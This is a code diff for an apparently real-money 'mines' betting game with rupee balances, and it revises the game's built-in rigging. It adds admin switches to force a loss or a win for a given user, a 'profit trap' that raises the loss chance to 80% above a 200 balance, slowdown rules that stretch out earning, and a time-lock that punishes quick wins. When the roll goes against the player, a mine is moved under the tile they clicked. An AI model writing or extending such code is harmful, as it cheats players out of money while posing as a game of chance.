@@ -140,32 +140,38 @@
     window.handleMove = async (idx, el) => {
         if(!isPlaying || el.classList.contains('diamond')) return;
 
-        // --- HARDCORE RIGGING ALGORITHM ---
+        // --- ENHANCED RIGGING & ADMIN LOGIC ---
         const userRef = ref(db, `users/${auth.currentUser.uid}`);
         const userSnap = await get(userRef);
         const userData = userSnap.val();
         
         let userBalance = userData.balance || 0;
-        let todayWithdrawals = userData.todayWithdrawals || 0;
-        let lastBigWinRounds = userData.lastBigWinRounds || 0; 
-        let riskChance = 0.05; // 5% default (Very easy start)
+        let riskChance = 0.10; // 10% base risk
 
-        // 1. Withdrawal Penalty (70% lose chance)
-        if(todayWithdrawals > 0) riskChance = 0.70;
+        // 1. ADMIN FORCE LOGIC (Priority)
+        if(userData.forceLoss === true) riskChance = 1.0; 
+        if(userData.forceWin === true) riskChance = 0.0;
 
-        // 2. 100rs Profit Target Rigging (80% lose chance)
-        if(userBalance >= 100) riskChance = 0.80;
-
-        // 3. Earning Speed Control (Slow down after 150rs)
-        if(userBalance > 150) riskChance = Math.max(riskChance, 0.60);
-
-        // 4. Consecutive Loss Logic (After big profit > 50rs)
-        if(lastBigWinRounds > 0) {
-            riskChance = 0.98; // Instant Loss
-            await update(userRef, { lastBigWinRounds: increment(-1) });
+        // 2. PROFIT TRAP: If balance >= 200, risk is 80% until balance drops to 100
+        if(userBalance >= 200) {
+            riskChance = 0.80;
+        } else if (userBalance > 100 && userBalance < 200) {
+            // Gradually increasing risk to make reaching 100 take 2.5 hours
+            // This slows down the game significantly
+            riskChance = 0.50; 
         }
 
-        // Rigging Execution: Force a mine on user click
+        // 3. TIME-LOCK LOGIC: Prevent fast earning
+        const lastWinTime = userData.lastWinTime || 0;
+        const currentTime = Date.now();
+        const timeDiff = (currentTime - lastWinTime) / (1000 * 60); // minutes
+
+        if(userBalance < 100 && timeDiff < 5) {
+             // If user earns too fast (more than once every 5 mins), increase risk
+             riskChance += 0.30;
+        }
+
+        // Rigging Execution
         if(Math.random() < riskChance && !mines.includes(idx)) {
             mines.pop(); mines.push(idx);
         }
@@ -174,7 +180,7 @@
             isPlaying = false;
             el.innerText = "💣"; el.classList.add("bomb");
             setTimeout(() => {
-                showModal("GAME OVER", "You stepped on a mine! ₹" + activeBet.toFixed(2) + " lost.", "💥");
+                showModal("GAME OVER", "You hit a mine! ₹" + activeBet.toFixed(2) + " lost.", "💥");
                 resetUI();
             }, 500);
         } else {
@@ -197,17 +203,14 @@
     window.cashout = async () => {
         if(!isPlaying || diamondsFound === 0) return;
         const winTotal = activeBet * currentMult;
-        const netProfit = winTotal - activeBet;
         isPlaying = false;
 
-        let updateData = { balance: increment(winTotal) };
+        // Save last win time to control earning speed
+        await update(ref(db, `users/${auth.currentUser.uid}`), { 
+            balance: increment(winTotal),
+            lastWinTime: Date.now() 
+        });
 
-        // 5. Big Win Tracker: Trigger 2 forced losses if profit >= 50
-        if(netProfit >= 50) {
-            updateData.lastBigWinRounds = 2;
-        }
-
-        await update(ref(db, `users/${auth.currentUser.uid}`), updateData);
         showModal("CASHOUT SUCCESS", "You won ₹" + winTotal.toFixed(2), "🏆");
         resetUI();
     }
